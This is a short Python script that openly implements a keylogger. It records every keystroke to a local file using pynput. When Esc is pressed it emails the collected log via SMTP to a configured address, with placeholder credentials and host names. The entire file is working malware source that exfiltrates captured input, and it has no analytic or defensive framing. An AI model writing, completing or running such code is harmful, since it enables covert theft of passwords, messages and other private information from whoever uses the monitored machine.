import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener

# Email configuration
email_address = "your_email@example.com"
email_password = "your_password"
to_address = "recipient_email@example.com"
smtp_server = "smtp.example.com"
smtp_port = 465

# Log file
log_file = "keylog.txt"

def send_email(log_content):
    message = MIMEMultipart()
    message["From"] = email_address
    message["To"] = to_address
    message["Subject"] = "Keylogger Report"

    message.attach(MIMEText(log_content, "plain"))

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(smtp_server, smtp_port, context=context) as server:
        server.login(email_address, email_password)
        server.sendmail(email_address, to_address, message.as_string())

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                f.write(" ")
            else:
                f.write(f" {str(key)} ")

def on_release(key):
    if key == Key.esc:
        return False

def main():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Read the log file
    with open(log_file, "r") as f:
        log_content = f.read()

    # Send the log file content via email
    send_email(log_content)

if __name__ == "__main__":
    main()

